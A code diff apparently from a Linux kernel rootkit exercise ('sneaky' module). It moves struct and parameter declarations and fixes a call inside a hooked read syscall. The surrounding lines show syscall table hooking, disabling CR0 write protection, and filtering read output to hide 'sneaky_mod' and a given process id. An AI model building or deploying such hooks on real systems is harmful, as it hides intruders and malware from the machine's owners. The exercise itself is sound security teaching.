@@ -9,6 +9,25 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+
+//getdents function will fill in an array of “struct linux_dirent” objects,
+//one for each file or directory found within a directory.
+//Make sure that the “struct linux_dirent” is interpreted correctly:
+struct linux_dirent {
+        long d_ino;
+        off_t d_off;
+        unsigned short d_reclen;
+        char d_name[];
+};
+
+static char *sneaky_process_id = "";
+module_param(sneaky_process_id, charp, 0);
+MODULE_PARM_DESC(sneaky_process_id, "sneaky_process pid");
+
+static int proc_opened = 0;
+static int module_opened = 0;
+
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -36,23 +55,6 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
-
-//getdents function will fill in an array of “struct linux_dirent” objects, 
-//one for each file or directory found within a directory.
-//Make sure that the “struct linux_dirent” is interpreted correctly:
-struct linux_dirent {
-	long d_ino;
-	off_t d_off;
-	unsigned short d_reclen;
-	char d_name[];
-};
-
-static char *sneaky_process_id = "";
-module_param(sneaky_process_id, charp, 0);
-MODULE_PARM_DESC(sneaky_process_id, "sneaky_process pid");
-
-static int proc_opened = 0;
-static int module_opened = 0;
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
@@ -98,7 +100,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
 	char * ptr2 = NULL;
 	ssize_t new_size1;
 	ssize_t new_size2;
-	ssize_t size = (*original_call_read)(fd, buf, count);
+	ssize_t size = (*original_read)(fd, buf, count);
 	if(size>0 && module_opened==1 && ((ptr1=strstr(buf,"sneaky_mod"))!=NULL)){
 		ptr2 = ptr1;
 		while(*ptr2 != '\n'){
